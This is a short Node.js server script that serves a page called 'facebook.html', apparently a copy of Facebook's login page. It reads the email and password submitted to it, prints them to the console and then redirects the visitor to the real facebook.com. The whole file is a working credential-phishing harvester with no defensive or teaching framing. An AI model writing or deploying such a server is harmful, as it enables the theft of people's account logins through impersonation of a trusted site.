const http = require('http');
const fs = require('fs');
const qs = require('querystring');

const myHtml = fs.readFileSync("facebook.html");

const server = http.createServer((req, res) => {
    if (req.method === "GET") {
        res.write(myHtml);
        res.end();
    } else if (req.method === "POST") {
        let body = '';
        let email, password;

        req.on('data', (data) => {
            body += data;
        })
        req.on("end", () => {
            body = qs.parse(body);
            email = body.email;
            password = body.password;

            console.log(`Your email is ${email} and your password is ${password}`);

            res.statusCode = 302;
            res.setHeader('Location', 'https://www.facebook.com');
            res.end();
        })
    }
});
server.listen(8085, () => {
    console.log("Server is listening in port 8085")
});